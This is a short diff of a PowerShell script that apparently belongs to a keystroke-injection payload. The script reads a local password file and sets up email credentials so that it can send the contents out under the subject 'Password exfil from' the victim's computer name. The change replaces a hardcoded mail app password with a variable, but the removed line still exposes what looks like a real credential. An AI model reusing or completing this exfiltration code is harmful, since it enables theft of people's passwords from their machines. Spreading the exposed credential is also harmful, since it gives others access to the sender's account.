@@ -5,7 +5,7 @@ $dateiPfad = "C:\Users\marwi\Downloads\pw.txt"
 $From = "injectionkeystroke@gmail.com"
 $To = "maklo119@hhu.de"
 $Subject = "Password exfil from $($env:computername)"
-$Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
+$Password = $PW | ConvertTo-SecureString -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 
 # Webseite im Standard-Browser öffnen
